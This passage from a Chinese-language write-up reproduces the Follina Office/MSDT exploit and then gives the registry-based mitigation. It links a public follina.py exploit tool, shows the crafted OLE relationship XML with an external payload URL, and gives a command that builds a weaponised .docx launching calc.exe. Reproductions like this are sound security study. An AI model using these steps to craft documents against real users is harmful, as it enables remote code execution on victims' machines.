## 三、复现步骤

### 1.payload下载

地址：

```
https://github.com/chvancooten/follina.py
```

### 2.复现

2.1 在存放payload的文件夹下

1）首先生成一个插入了OLE链接的docx文档。新建一个docx后缀的word文档。

![](../Images/e09ee4292e60db93e3ce0623d68edcee.png)

2）使用office word打开新建的文件，插入OLE链接。

具体插入流程为顶部工具栏 **插入-对象**

![](../Images/29406f5ea8a57bb9f76f64d253a6c844.png)

3）将word目录下\_res文件下的document.xml.rels复制出来；在1）中文件创建src文件夹并将复制出来的document.xml.rels加上.tpl后缀，内容修改为

```
<Relationship Id="rId1111" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="{payload\_url}!" TargetMode="External"/>
```

![](../Images/6f63d58e64a2d725c876bd4044ec444f.png)

4）在创建www文件夹

![](../Images/9bfdcfaead68fc41c0c03b2f5287ec73.png)

 5）创建exploit.html文件，内容在文章最前面；将exploit.html加后缀.tpl放入src目录下

![](../Images/df398b03937548536f9ce184bc4a9d5a.png)

6）在存放payload的文件夹下打开cmd，输入命令：

```
python .\\follina.py -t docx -m binary -b calc.exe -P 8081
```

![](../Images/a0034ed1cb1e001cc00b3b817425c622.png)

打开生成的文件，复现成功

![](../Images/49e1aa17798126627188a9ea7626f2f2.png)

## 四、防范修复

目前已有官方的补丁

但是可以禁用 MSDT URL 协议可防止故障排除程序作为链接启动，包括整个操作系统的链接。仍然可以使用“获取帮助”应用程序和系统设置中的其他或附加故障排除程序来访问故障排除程序。请按照以下步骤禁用：

以管理员身份运行命令提示符。

要备份注册表项，请执行命令“reg export HKEY\_CLASSES\_ROOT\\ms-msdt filename ”

执行命令“reg delete HKEY\_CLASSES\_ROOT\\ms-msdt /f”。

如何撤消解决方法

以管理员身份运行命令提示符。要恢复注册表项，请执行命令“reg import filename”
